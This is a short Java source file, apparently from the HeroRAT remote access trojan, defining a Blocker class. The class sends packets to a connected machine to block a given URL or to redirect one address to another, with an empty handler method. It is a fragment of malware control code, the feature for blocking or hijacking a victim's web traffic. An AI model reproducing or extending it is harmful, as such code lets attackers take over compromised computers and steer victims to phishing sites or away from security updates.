package net.herorat.features.blocker;

import net.herorat.features.servers.Server;
import net.herorat.network.Packet;
import net.herorat.network.Packet14Blocker;


public class Blocker
{	
	public static void send(Server server, String url)
	{
		Packet p = new Packet14Blocker(server.outputstream, new String[] { "add", url });
		p.write();
	}
	
	public static void send(Server server, String from, String to)
	{
		Packet p = new Packet14Blocker(server.outputstream, new String[] { "redirect", from, to });
		p.write();
	}

	public static void handle(Server server, String[] args)
	{
	}
}